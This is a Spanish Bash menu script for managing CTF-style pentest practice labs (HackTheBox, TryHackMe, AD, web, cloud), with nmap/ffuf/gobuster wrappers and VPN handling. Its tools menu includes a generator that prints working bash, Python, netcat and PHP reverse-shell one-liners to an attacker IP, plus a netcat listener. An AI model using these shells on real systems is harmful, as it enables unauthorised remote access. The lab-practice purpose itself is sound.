#!/bin/bash

# ─── MAIN.SH - Menú Principal para 13_Labs ──────────────────
# Este script sirve como punto de entrada central para todos
# los laboratorios y herramientas del framework

# ─── Configuración ──────────────────────────────────────────
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR" || exit 1

# Colores para mejor visualización
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color
BOLD='\033[1m'

# ─── Funciones de Utilidad ──────────────────────────────────

# Función para limpiar pantalla
clear_screen() {
    clear
}

# Función para mostrar banner
show_banner() {
    echo -e "${CYAN}${BOLD}"
    echo "╔═══════════════════════════════════════════════════════════╗"
    echo "║                                                           ║"
    echo "║     🛡️  13_LABS - Cybersecurity Framework  🛡️          ║"
    echo "║                                                           ║"
    echo "║     ${WHITE}Menú Principal de Laboratorios y Herramientas${CYAN}     ║"
    echo "║                                                           ║"
    echo "╚═══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
}

# Función para mostrar estado de VPN
show_vpn_status() {
    echo -e "${YELLOW}━━━ Estado de Conexiones ━━━${NC}"
    
    # Verificar HTB VPN
    if ip a | grep -q "tun0"; then
        HTB_IP=$(ip a | grep tun0 | grep inet | awk '{print $2}' | cut -d/ -f1)
        echo -e "  ${GREEN}✓${NC} HTB VPN: ${WHITE}Conectado${NC} (${BLUE}$HTB_IP${NC})"
    else
        echo -e "  ${RED}✗${NC} HTB VPN: ${WHITE}Desconectado${NC}"
    fi
    
    # Verificar THM VPN
    if ip a | grep -q "tun1"; then
        THM_IP=$(ip a | grep tun1 | grep inet | awk '{print $2}' | cut -d/ -f1)
        echo -e "  ${GREEN}✓${NC} THM VPN: ${WHITE}Conectado${NC} (${BLUE}$THM_IP${NC})"
    else
        echo -e "  ${RED}✗${NC} THM VPN: ${WHITE}Desconectado${NC}"
    fi
    
    echo ""
}

# Función para mostrar estadísticas rápidas
show_stats() {
    echo -e "${YELLOW}━━━ Estadísticas Rápidas ━━━${NC}"
    
    # Contar máquinas HTB
    HTB_COUNT=$(find hackthebox/machines -maxdepth 1 -type d 2>/dev/null | wc -l)
    HTB_COUNT=$((HTB_COUNT - 1)) # Restar el directorio base
    echo -e "  🎯 HTB Máquinas: ${WHITE}$HTB_COUNT${NC}"
    
    # Contar salas THM
    THM_COUNT=$(find tryhackme/rooms -maxdepth 1 -type d 2>/dev/null | wc -l)
    THM_COUNT=$((THM_COUNT - 1))
    echo -e "  🎯 THM Salas: ${WHITE}$THM_COUNT${NC}"
    
    # Contar dominios AD
    AD_COUNT=$(find active_directory/machines -maxdepth 1 -type d 2>/dev/null | wc -l)
    AD_COUNT=$((AD_COUNT - 1))
    echo -e "  🎯 AD Dominios: ${WHITE}$AD_COUNT${NC}"
    
    echo ""
}

# ─── Funciones del Menú ──────────────────────────────────────

# Menú principal
main_menu() {
    clear_screen
    show_banner
    show_vpn_status
    show_stats
    
    echo -e "${BOLD}${WHITE}┌────────────────────────────────────────────────────────┐${NC}"
    echo -e "${BOLD}${WHITE}│           SELECCIONA UNA OPCIÓN                         │${NC}"
    echo -e "${BOLD}${WHITE}└────────────────────────────────────────────────────────┘${NC}"
    echo ""
    echo -e "${GREEN}1.${NC} 📁 Laboratorios HTB (HackTheBox)"
    echo -e "${GREEN}2.${NC} 📁 Laboratorios THM (TryHackMe)"
    echo -e "${GREEN}3.${NC} 🏢 Active Directory"
    echo -e "${GREEN}4.${NC} 🌐 Aplicaciones Web"
    echo -e "${GREEN}5.${NC} ☁️  Cloud"
    echo -e "${GREEN}6.${NC} 🛠️  Herramientas Rápidas"
    echo -e "${GREEN}7.${NC} 📊 Ver Todos los Laboratorios"
    echo -e "${GREEN}8.${NC} 🔄 Conectar VPN"
    echo -e "${GREEN}9.${NC} 🗑️  Eliminar Laboratorio"
    echo -e "${GREEN}10.${NC}ℹ️  Ayuda y Comandos Útiles"
    echo -e "${GREEN}11.${NC}🚪 Salir"
    echo ""
    echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -ne "${BOLD}${WHITE}➜ Selecciona una opción [1-11]: ${NC}"
}

# Menú HTB
htb_menu() {
    clear_screen
    echo -e "${BLUE}${BOLD}━━━ HACKTHEBOX ━━━${NC}"
    echo ""
    echo -e "${GREEN}1.${NC} Configurar nueva máquina"
    echo -e "${GREEN}2.${NC} Ver máquinas configuradas"
    echo -e "${GREEN}3.${NC} Abrir notas de una máquina"
    echo -e "${GREEN}4.${NC} Ver notas generales HTB"
    echo -e "${GREEN}5.${NC} Volver al menú principal"
    echo ""
    echo -ne "${BOLD}${WHITE}➜ Selecciona una opción [1-5]: ${NC}"
    read -r option
    
    case $option in
        1)
            echo -ne "${YELLOW}Nombre de la máquina: ${NC}"
            read -r machine
            if [[ -n "$machine" ]]; then
                cd hackthebox && ./htb_setup.sh "$machine"
                echo -e "\n${GREEN}✅ Máquina configurada correctamente${NC}"
                echo -e "${YELLOW}Presiona Enter para continuar...${NC}"
                read -r
            fi
            htb_menu
            ;;
        2)
            echo -e "\n${YELLOW}Máquinas configuradas:${NC}"
            ls -la hackthebox/machines/ 2>/dev/null | grep "^d" | awk '{print "  📁 " $9}'
            echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}"
            read -r
            htb_menu
            ;;
        3)
            echo -ne "${YELLOW}Nombre de la máquina: ${NC}"
            read -r machine
            if [[ -f "hackthebox/machines/$machine/notes/README.md" ]]; then
                ${EDITOR:-nano} "hackthebox/machines/$machine/notes/README.md"
            else
                echo -e "${RED}❌ Máquina no encontrada${NC}"
                sleep 2
            fi
            htb_menu
            ;;
        4)
            if [[ -f "hackthebox/htb_notes.md" ]]; then
                ${EDITOR:-nano} "hackthebox/htb_notes.md"
            else
                echo -e "${RED}❌ Archivo de notas no encontrado${NC}"
                sleep 2
            fi
            htb_menu
            ;;
        5)
            main_menu
            ;;
        *)
            echo -e "${RED}Opción inválida${NC}"
            sleep 2
            htb_menu
            ;;
    esac
}

# Menú THM
thm_menu() {
    clear_screen
    echo -e "${PURPLE}${BOLD}━━━ TRYHACKME ━━━${NC}"
    echo ""
    echo -e "${GREEN}1.${NC} Configurar nueva sala"
    echo -e "${GREEN}2.${NC} Ver salas configuradas"
    echo -e "${GREEN}3.${NC} Abrir notas de una sala"
    echo -e "${GREEN}4.${NC} Ver notas generales THM"
    echo -e "${GREEN}5.${NC} Volver al menú principal"
    echo ""
    echo -ne "${BOLD}${WHITE}➜ Selecciona una opción [1-5]: ${NC}"
    read -r option
    
    case $option in
        1)
            echo -ne "${YELLOW}Nombre de la sala: ${NC}"
            read -r room
            if [[ -n "$room" ]]; then
                cd tryhackme && ./thm_setup.sh "$room"
                echo -e "\n${GREEN}✅ Sala configurada correctamente${NC}"
                echo -e "${YELLOW}Presiona Enter para continuar...${NC}"
                read -r
            fi
            thm_menu
            ;;
        2)
            echo -e "\n${YELLOW}Salas configuradas:${NC}"
            ls -la tryhackme/rooms/ 2>/dev/null | grep "^d" | awk '{print "  📁 " $9}'
            echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}"
            read -r
            thm_menu
            ;;
        3)
            echo -ne "${YELLOW}Nombre de la sala: ${NC}"
            read -r room
            if [[ -f "tryhackme/rooms/$room/notes/README.md" ]]; then
                ${EDITOR:-nano} "tryhackme/rooms/$room/notes/README.md"
            else
                echo -e "${RED}❌ Sala no encontrada${NC}"
                sleep 2
            fi
            thm_menu
            ;;
        4)
            if [[ -f "tryhackme/thm_notes.md" ]]; then
                ${EDITOR:-nano} "tryhackme/thm_notes.md"
            else
                echo -e "${RED}❌ Archivo de notas no encontrado${NC}"
                sleep 2
            fi
            thm_menu
            ;;
        5)
            main_menu
            ;;
        *)
            echo -e "${RED}Opción inválida${NC}"
            sleep 2
            thm_menu
            ;;
    esac
}

# Menú Active Directory
ad_menu() {
    clear_screen
    echo -e "${YELLOW}${BOLD}━━━ ACTIVE DIRECTORY ━━━${NC}"
    echo ""
    echo -e "${GREEN}1.${NC} Configurar nuevo dominio"
    echo -e "${GREEN}2.${NC} Ver dominios configurados"
    echo -e "${GREEN}3.${NC} Abrir notas de un dominio"
    echo -e "${GREEN}4.${NC} Ver notas de ataques AD"
    echo -e "${GREEN}5.${NC} Volver al menú principal"
    echo ""
    echo -ne "${BOLD}${WHITE}➜ Selecciona una opción [1-5]: ${NC}"
    read -r option
    
    case $option in
        1)
            echo -ne "${YELLOW}Nombre del dominio (ej: domain.local): ${NC}"
            read -r domain
            if [[ -n "$domain" ]]; then
                cd active_directory && ./ad_setup.sh "$domain"
                echo -e "\n${GREEN}✅ Dominio configurado correctamente${NC}"
                echo -e "${YELLOW}Presiona Enter para continuar...${NC}"
                read -r
            fi
            ad_menu
            ;;
        2)
            echo -e "\n${YELLOW}Dominios configurados:${NC}"
            ls -la active_directory/machines/ 2>/dev/null | grep "^d" | awk '{print "  📁 " $9}'
            echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}"
            read -r
            ad_menu
            ;;
        3)
            echo -ne "${YELLOW}Nombre del dominio: ${NC}"
            read -r domain
            if [[ -f "active_directory/machines/$domain/notes/README.md" ]]; then
                ${EDITOR:-nano} "active_directory/machines/$domain/notes/README.md"
            else
                echo -e "${RED}❌ Dominio no encontrado${NC}"
                sleep 2
            fi
            ad_menu
            ;;
        4)
            if [[ -f "active_directory/ad_attack_notes.md" ]]; then
                ${EDITOR:-nano} "active_directory/ad_attack_notes.md"
            else
                echo -e "${RED}❌ Archivo de notas no encontrado${NC}"
                sleep 2
            fi
            ad_menu
            ;;
        5)
            main_menu
            ;;
        *)
            echo -e "${RED}Opción inválida${NC}"
            sleep 2
            ad_menu
            ;;
    esac
}

# Menú Web Apps
web_menu() {
    clear_screen
    echo -e "${GREEN}${BOLD}━━━ WEB APPS ━━━${NC}"
    echo ""
    echo -e "${GREEN}1.${NC} Configurar nueva aplicación"
    echo -e "${GREEN}2.${NC} Ver aplicaciones configuradas"
    echo -e "${GREEN}3.${NC} Abrir notas de una aplicación"
    echo -e "${GREEN}4.${NC} Ver notas generales Web"
    echo -e "${GREEN}5.${NC} Volver al menú principal"
    echo ""
    echo -ne "${BOLD}${WHITE}➜ Selecciona una opción [1-5]: ${NC}"
    read -r option
    
    case $option in
        1)
            echo -ne "${YELLOW}Nombre de la aplicación: ${NC}"
            read -r app
            if [[ -n "$app" ]]; then
                cd web_apps && ./web_setup.sh "$app"
                echo -e "\n${GREEN}✅ Aplicación configurada correctamente${NC}"
                echo -e "${YELLOW}Presiona Enter para continuar...${NC}"
                read -r
            fi
            web_menu
            ;;
        2)
            echo -e "\n${YELLOW}Aplicaciones configuradas:${NC}"
            ls -la web_apps/machines/ 2>/dev/null | grep "^d" | awk '{print "  📁 " $9}'
            echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}"
            read -r
            web_menu
            ;;
        3)
            echo -ne "${YELLOW}Nombre de la aplicación: ${NC}"
            read -r app
            if [[ -f "web_apps/machines/$app/notes/README.md" ]]; then
                ${EDITOR:-nano} "web_apps/machines/$app/notes/README.md"
            else
                echo -e "${RED}❌ Aplicación no encontrada${NC}"
                sleep 2
            fi
            web_menu
            ;;
        4)
            if [[ -f "web_apps/web_notes.md" ]]; then
                ${EDITOR:-nano} "web_apps/web_notes.md"
            else
                echo -e "${RED}❌ Archivo de notas no encontrado${NC}"
                sleep 2
            fi
            web_menu
            ;;
        5)
            main_menu
            ;;
        *)
            echo -e "${RED}Opción inválida${NC}"
            sleep 2
            web_menu
            ;;
    esac
}

# Menú Cloud
cloud_menu() {
    clear_screen
    echo -e "${CYAN}${BOLD}━━━ CLOUD ━━━${NC}"
    echo ""
    echo -e "${GREEN}1.${NC} Configurar nuevo laboratorio cloud"
    echo -e "${GREEN}2.${NC} Ver laboratorios configurados"
    echo -e "${GREEN}3.${NC} Abrir notas de un laboratorio"
    echo -e "${GREEN}4.${NC} Ver notas generales Cloud"
    echo -e "${GREEN}5.${NC} Volver al menú principal"
    echo ""
    echo -ne "${BOLD}${WHITE}➜ Selecciona una opción [1-5]: ${NC}"
    read -r option
    
    case $option in
        1)
            echo -ne "${YELLOW}Nombre del laboratorio: ${NC}"
            read -r lab
            if [[ -n "$lab" ]]; then
                cd cloud && ./cloud_setup.sh "$lab"
                echo -e "\n${GREEN}✅ Laboratorio configurado correctamente${NC}"
                echo -e "${YELLOW}Presiona Enter para continuar...${NC}"
                read -r
            fi
            cloud_menu
            ;;
        2)
            echo -e "\n${YELLOW}Laboratorios configurados:${NC}"
            ls -la cloud/machines/ 2>/dev/null | grep "^d" | awk '{print "  📁 " $9}'
            echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}"
            read -r
            cloud_menu
            ;;
        3)
            echo -ne "${YELLOW}Nombre del laboratorio: ${NC}"
            read -r lab
            if [[ -f "cloud/machines/$lab/notes/README.md" ]]; then
                ${EDITOR:-nano} "cloud/machines/$lab/notes/README.md"
            else
                echo -e "${RED}❌ Laboratorio no encontrado${NC}"
                sleep 2
            fi
            cloud_menu
            ;;
        4)
            if [[ -f "cloud/cloud_notes.md" ]]; then
                ${EDITOR:-nano} "cloud/cloud_notes.md"
            else
                echo -e "${RED}❌ Archivo de notas no encontrado${NC}"
                sleep 2
            fi
            cloud_menu
            ;;
        5)
            main_menu
            ;;
        *)
            echo -e "${RED}Opción inválida${NC}"
            sleep 2
            cloud_menu
            ;;
    esac
}

# Menú Herramientas Rápidas
tools_menu() {
    clear_screen
    echo -e "${GREEN}${BOLD}━━━ HERRAMIENTAS RÁPIDAS ━━━${NC}"
    echo ""
    echo -e "${GREEN}1.${NC} 🔍 Escaneo Nmap rápido"
    echo -e "${GREEN}2.${NC} 🌐 Escaneo Web con whatweb"
    echo -e "${GREEN}3.${NC} 🔎 Fuzzing con ffuf"
    echo -e "${GREEN}4.${NC} 🗄️  Enumeración de directorios con gobuster"
    echo -e "${GREEN}5.${NC} 🖥️  Shell reversa (Generador)"
    echo -e "${GREEN}6.${NC} 📡 Netcat listener"
    echo -e "${GREEN}7.${NC} 🔑 Generar palabra clave hash"
    echo -e "${GREEN}8.${NC} 📝 Notas rápidas"
    echo -e "${GREEN}9.${NC} Volver al menú principal"
    echo ""
    echo -ne "${BOLD}${WHITE}➜ Selecciona una opción [1-9]: ${NC}"
    read -r option
    
    case $option in
        1)
            echo -ne "${YELLOW}IP objetivo: ${NC}"
            read -r ip
            if [[ -n "$ip" ]]; then
                echo -e "${GREEN}Ejecutando: nmap -sV -sC -p- $ip${NC}"
                nmap -sV -sC -p- "$ip"
                echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}"
                read -r
            fi
            tools_menu
            ;;
        2)
            echo -ne "${YELLOW}URL objetivo (ej: http://10.10.10.1): ${NC}"
            read -r url
            if [[ -n "$url" ]]; then
                echo -e "${GREEN}Ejecutando: whatweb $url${NC}"
                whatweb "$url"
                echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}"
                read -r
            fi
            tools_menu
            ;;
        3)
            echo -ne "${YELLOW}URL objetivo (ej: http://10.10.10.1/FUZZ): ${NC}"
            read -r url
            echo -ne "${YELLOW}Ruta al wordlist: ${NC}"
            read -r wordlist
            if [[ -n "$url" && -n "$wordlist" ]]; then
                echo -e "${GREEN}Ejecutando: ffuf -w $wordlist -u $url${NC}"
                ffuf -w "$wordlist" -u "$url"
                echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}"
                read -r
            fi
            tools_menu
            ;;
        4)
            echo -ne "${YELLOW}URL objetivo (ej: http://10.10.10.1): ${NC}"
            read -r url
            echo -ne "${YELLOW}Ruta al wordlist: ${NC}"
            read -r wordlist
            if [[ -n "$url" && -n "$wordlist" ]]; then
                echo -e "${GREEN}Ejecutando: gobuster dir -u $url -w $wordlist${NC}"
                gobuster dir -u "$url" -w "$wordlist"
                echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}"
                read -r
            fi
            tools_menu
            ;;
        5)
            echo -e "${YELLOW}Generador de Shell Reversa${NC}"
            echo -e "${GREEN}1.${NC} Bash"
            echo -e "${GREEN}2.${NC} Python"
            echo -e "${GREEN}3.${NC} Netcat"
            echo -e "${GREEN}4.${NC} PHP"
            echo -e "${GREEN}5.${NC} Volver"
            echo -ne "${BOLD}${WHITE}➜ Selecciona [1-5]: ${NC}"
            read -r shell_opt
            
            echo -ne "${YELLOW}IP atacante: ${NC}"
            read -r lhost
            echo -ne "${YELLOW}Puerto: ${NC}"
            read -r lport
            
            if [[ -n "$lhost" && -n "$lport" ]]; then
                case $shell_opt in
                    1)
                        echo -e "${GREEN}bash -i >& /dev/tcp/$lhost/$lport 0>&1${NC}"
                        ;;
                    2)
                        echo -e "${GREEN}python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'${NC}"
                        ;;
                    3)
                        echo -e "${GREEN}nc $lhost $lport -e /bin/bash${NC}"
                        ;;
                    4)
                        echo -e "${GREEN}php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'${NC}"
                        ;;
                    *)
                        echo -e "${RED}Opción inválida${NC}"
                        ;;
                esac
                echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}"
                read -r
            fi
            tools_menu
            ;;
        6)
            echo -ne "${YELLOW}Puerto para listener: ${NC}"
            read -r port
            if [[ -n "$port" ]]; then
                echo -e "${GREEN}Iniciando listener en puerto $port...${NC}"
                echo -e "${YELLOW}Presiona Ctrl+C para detener${NC}"
                nc -lvnp "$port"
                echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}"
                read -r
            fi
            tools_menu
            ;;
        7)
            echo -ne "${YELLOW}Contraseña a hashear: ${NC}"
            read -r pass
            if [[ -n "$pass" ]]; then
                echo -e "${GREEN}MD5: $(echo -n "$pass" | md5sum | cut -d' ' -f1)${NC}"
                echo -e "${GREEN}SHA1: $(echo -n "$pass" | sha1sum | cut -d' ' -f1)${NC}"
                echo -e "${GREEN}SHA256: $(echo -n "$pass" | sha256sum | cut -d' ' -f1)${NC}"
                echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}"
                read -r
            fi
            tools_menu
            ;;
        8)
            echo -e "${YELLOW}Notas rápidas (Ctrl+D para guardar, Ctrl+C para cancelar):${NC}"
            echo -e "${GREEN}Guardando en: notes_$(date +%Y%m%d_%H%M%S).txt${NC}"
            cat > "notes_$(date +%Y%m%d_%H%M%S).txt"
            echo -e "\n${GREEN}✅ Notas guardadas${NC}"
            echo -e "${YELLOW}Presiona Enter para continuar...${NC}"
            read -r
            tools_menu
            ;;
        9)
            main_menu
            ;;
        *)
            echo -e "${RED}Opción inválida${NC}"
            sleep 2
            tools_menu
            ;;
    esac
}

# Función VPN
vpn_menu() {
    clear_screen
    echo -e "${CYAN}${BOLD}━━━ CONEXIÓN VPN ━━━${NC}"
    echo ""
    echo -e "${GREEN}1.${NC} Conectar HTB VPN"
    echo -e "${GREEN}2.${NC} Conectar THM VPN"
    echo -e "${GREEN}3.${NC} Desconectar todas las VPN"
    echo -e "${GREEN}4.${NC} Ver estado de VPN"
    echo -e "${GREEN}5.${NC} Volver al menú principal"
    echo ""
    echo -ne "${BOLD}${WHITE}➜ Selecciona una opción [1-5]: ${NC}"
    read -r option
    
    case $option in
        1)
            echo -ne "${YELLOW}Ruta al archivo .ovpn de HTB: ${NC}"
            read -r ovpn_file
            if [[ -f "$ovpn_file" ]]; then
                echo -e "${GREEN}Conectando a HTB VPN...${NC}"
                sudo openvpn --config "$ovpn_file" --daemon
                sleep 3
                echo -e "${GREEN}✅ VPN conectada${NC}"
            else
                echo -e "${RED}❌ Archivo no encontrado${NC}"
            fi
            echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}"
            read -r
            vpn_menu
            ;;
        2)
            echo -ne "${YELLOW}Ruta al archivo .ovpn de THM: ${NC}"
            read -r ovpn_file
            if [[ -f "$ovpn_file" ]]; then
                echo -e "${GREEN}Conectando a THM VPN...${NC}"
                sudo openvpn --config "$ovpn_file" --daemon
                sleep 3
                echo -e "${GREEN}✅ VPN conectada${NC}"
            else
                echo -e "${RED}❌ Archivo no encontrado${NC}"
            fi
            echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}"
            read -r
            vpn_menu
            ;;
        3)
            echo -e "${YELLOW}Desconectando todas las VPN...${NC}"
            sudo pkill openvpn
            echo -e "${GREEN}✅ VPNs desconectadas${NC}"
            echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}"
            read -r
            vpn_menu
            ;;
        4)
            echo -e "\n${YELLOW}Estado de VPN:${NC}"
            ip a | grep -E "tun[0-9]+"
            echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}"
            read -r
            vpn_menu
            ;;
        5)
            main_menu
            ;;
        *)
            echo -e "${RED}Opción inválida${NC}"
            sleep 2
            vpn_menu
            ;;
    esac
}

# Función Eliminar Laboratorio
delete_menu() {
    clear_screen
    echo -e "${RED}${BOLD}━━━ ELIMINAR LABORATORIO ━━━${NC}"
    echo -e "${YELLOW}⚠️  CUIDADO: Esta acción es irreversible${NC}"
    echo ""
    echo -e "${GREEN}1.${NC} Eliminar máquina HTB"
    echo -e "${GREEN}2.${NC} Eliminar sala THM"
    echo -e "${GREEN}3.${NC} Eliminar dominio AD"
    echo -e "${GREEN}4.${NC} Eliminar aplicación web"
    echo -e "${GREEN}5.${NC} Eliminar laboratorio cloud"
    echo -e "${GREEN}6.${NC} Volver al menú principal"
    echo ""
    echo -ne "${BOLD}${WHITE}➜ Selecciona una opción [1-6]: ${NC}"
    read -r option
    
    case $option in
        1)
            echo -e "\n${YELLOW}Máquinas HTB disponibles:${NC}"
            ls -la hackthebox/machines/ 2>/dev/null | grep "^d" | awk '{print "  📁 " $9}'
            echo -ne "\n${YELLOW}Nombre de la máquina a eliminar: ${NC}"
            read -r machine
            if [[ -n "$machine" && -d "hackthebox/machines/$machine" ]]; then
                echo -ne "${RED}¿Estás seguro? (s/N): ${NC}"
                read -r confirm
                if [[ "$confirm" == "s" || "$confirm" == "S" ]]; then
                    rm -rf "hackthebox/machines/$machine"
                    echo -e "${GREEN}✅ Máquina eliminada${NC}"
                else
                    echo -e "${YELLOW}Operación cancelada${NC}"
                fi
            else
                echo -e "${RED}❌ Máquina no encontrada${NC}"
            fi
            echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}"
            read -r
            delete_menu
            ;;
        2)
            echo -e "\n${YELLOW}Salas THM disponibles:${NC}"
            ls -la tryhackme/rooms/ 2>/dev/null | grep "^d" | awk '{print "  📁 " $9}'
            echo -ne "\n${YELLOW}Nombre de la sala a eliminar: ${NC}"
            read -r room
            if [[ -n "$room" && -d "tryhackme/rooms/$room" ]]; then
                echo -ne "${RED}¿Estás seguro? (s/N): ${NC}"
                read -r confirm
                if [[ "$confirm" == "s" || "$confirm" == "S" ]]; then
                    rm -rf "tryhackme/rooms/$room"
                    echo -e "${GREEN}✅ Sala eliminada${NC}"
                else
                    echo -e "${YELLOW}Operación cancelada${NC}"
                fi
            else
                echo -e "${RED}❌ Sala no encontrada${NC}"
            fi
            echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}"
            read -r
            delete_menu
            ;;
        3)
            echo -e "\n${YELLOW}Dominios AD disponibles:${NC}"
            ls -la active_directory/machines/ 2>/dev/null | grep "^d" | awk '{print "  📁 " $9}'
            echo -ne "\n${YELLOW}Nombre del dominio a eliminar: ${NC}"
            read -r domain
            if [[ -n "$domain" && -d "active_directory/machines/$domain" ]]; then
                echo -ne "${RED}¿Estás seguro? (s/N): ${NC}"
                read -r confirm
                if [[ "$confirm" == "s" || "$confirm" == "S" ]]; then
                    rm -rf "active_directory/machines/$domain"
                    echo -e "${GREEN}✅ Dominio eliminado${NC}"
                else
                    echo -e "${YELLOW}Operación cancelada${NC}"
                fi
            else
                echo -e "${RED}❌ Dominio no encontrado${NC}"
            fi
            echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}"
            read -r
            delete_menu
            ;;
        4)
            echo -e "\n${YELLOW}Aplicaciones web disponibles:${NC}"
            ls -la web_apps/machines/ 2>/dev/null | grep "^d" | awk '{print "  📁 " $9}'
            echo -ne "\n${YELLOW}Nombre de la aplicación a eliminar: ${NC}"
            read -r app
            if [[ -n "$app" && -d "web_apps/machines/$app" ]]; then
                echo -ne "${RED}¿Estás seguro? (s/N): ${NC}"
                read -r confirm
                if [[ "$confirm" == "s" || "$confirm" == "S" ]]; then
                    rm -rf "web_apps/machines/$app"
                    echo -e "${GREEN}✅ Aplicación eliminada${NC}"
                else
                    echo -e "${YELLOW}Operación cancelada${NC}"
                fi
            else
                echo -e "${RED}❌ Aplicación no encontrada${NC}"
            fi
            echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}"
            read -r
            delete_menu
            ;;
        5)
            echo -e "\n${YELLOW}Laboratorios cloud disponibles:${NC}"
            ls -la cloud/machines/ 2>/dev/null | grep "^d" | awk '{print "  📁 " $9}'
            echo -ne "\n${YELLOW}Nombre del laboratorio a eliminar: ${NC}"
            read -r lab
            if [[ -n "$lab" && -d "cloud/machines/$lab" ]]; then
                echo -ne "${RED}¿Estás seguro? (s/N): ${NC}"
                read -r confirm
                if [[ "$confirm" == "s" || "$confirm" == "S" ]]; then
                    rm -rf "cloud/machines/$lab"
                    echo -e "${GREEN}✅ Laboratorio eliminado${NC}"
                else
                    echo -e "${YELLOW}Operación cancelada${NC}"
                fi
            else
                echo -e "${RED}❌ Laboratorio no encontrado${NC}"
            fi
            echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}"
            read -r
            delete_menu
            ;;
        6)
            main_menu
            ;;
        *)
            echo -e "${RED}Opción inválida${NC}"
            sleep 2
            delete_menu
            ;;
    esac
}

# Función Ayuda
help_menu() {
    clear_screen
    echo -e "${CYAN}${BOLD}━━━ AYUDA Y COMANDOS ÚTILES ━━━${NC}"
    echo ""
    echo -e "${YELLOW}📚 COMANDOS BÁSICOS:${NC}"
    echo -e "  ${GREEN}./main.sh${NC} - Iniciar menú principal"
    echo -e "  ${GREEN}./setup_lab.sh <tipo> <nombre>${NC} - Configurar laboratorio"
    echo -e "  ${GREEN}./run_all_labs.sh${NC} - Listar todos los laboratorios"
    echo ""
    echo -e "${YELLOW}🔧 TIPOS DE LABORATORIO:${NC}"
    echo -e "  ${GREEN}htb${NC}   - HackTheBox"
    echo -e "  ${GREEN}thm${NC}   - TryHackMe"
    echo -e "  ${GREEN}ad${NC}    - Active Directory"
    echo -e "  ${GREEN}web${NC}   - Aplicaciones Web"
    echo -e "  ${GREEN}cloud${NC} - Cloud"
    echo ""
    echo -e "${YELLOW}💡 EJEMPLOS:${NC}"
    echo -e "  ${GREEN}./setup_lab.sh htb Blue${NC}"
    echo -e "  ${GREEN}./setup_lab.sh thm VulnNet${NC}"
    echo -e "  ${GREEN}./setup_lab.sh ad domain.local${NC}"
    echo ""
    echo -e "${YELLOW}📁 ESTRUCTURA DE DIRECTORIOS:${NC}"
    echo -e "  Cada laboratorio crea:"
    echo -e "  ${GREEN}machines/nombre/${NC}"
    echo -e "    ├── recon/     - Escaneos y reconocimiento"
    echo -e "    ├── exploits/  - Exploits y scripts"
    echo -e "    ├── loot/      - Credenciales y archivos"
    echo -e "    └── notes/     - Notas y documentación"
    echo ""
    echo -e "${YELLOW}🛠️  HERRAMIENTAS INCLUIDAS:${NC}"
    echo -e "  ${GREEN}nmap${NC}     - Escaneo de puertos"
    echo -e "  ${GREEN}gobuster${NC} - Fuzzing de directorios"
    echo -e "  ${GREEN}ffuf${NC}     - Fuzzing avanzado"
    echo -e "  ${GREEN}whatweb${NC}  - Reconocimiento web"
    echo -e "  ${GREEN}nc${NC}       - Netcat (listener/conexiones)"
    echo ""
    echo -e "${YELLOW}⌨️  ATAJOS DE TECLADO:${NC}"
    echo -e "  ${GREEN}Ctrl+C${NC} - Cancelar operación"
    echo -e "  ${GREEN}Ctrl+D${NC} - Guardar y salir (en notas)"
    echo -e "  ${GREEN}Ctrl+Z${NC} - Pausar proceso"
    echo ""
    echo -e "${YELLOW}Presiona Enter para volver al menú principal...${NC}"
    read -r
    main_menu
}

# ─── Función Principal ──────────────────────────────────────

# Verificar dependencias
check_dependencies() {
    local missing=()
    
    for cmd in nmap gobuster ffuf whatweb nc; do
        if ! command -v "$cmd" &> /dev/null; then
            missing+=("$cmd")
        fi
    done
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${YELLOW}⚠️  Algunas herramientas no están instaladas:${NC}"
        printf '  %s\n' "${missing[@]}"
        echo -e "${YELLOW}Instálalas con: sudo apt install ${missing[*]}${NC}"
        echo ""
    fi
}

# Bucle principal
main() {
    check_dependencies
    
    while true; do
        main_menu
        read -r choice
        
        case $choice in
            1) htb_menu ;;
            2) thm_menu ;;
            3) ad_menu ;;
            4) web_menu ;;
            5) cloud_menu ;;
            6) tools_menu ;;
            7) 
                clear_screen
                ./run_all_labs.sh
                echo -e "\n${YELLOW}Presiona Enter para continuar...${NC}"
                read -r
                ;;
            8) vpn_menu ;;
            9) delete_menu ;;
            10) help_menu ;;
            11) 
                echo -e "\n${GREEN}👋 ¡Hasta luego!${NC}"
                exit 0
                ;;
            *)
                echo -e "\n${RED}❌ Opción inválida${NC}"
                sleep 2
                ;;
        esac
    done
}

# ─── Ejecutar ──────────────────────────────────────────────

# Verificar que estamos en el directorio correcto
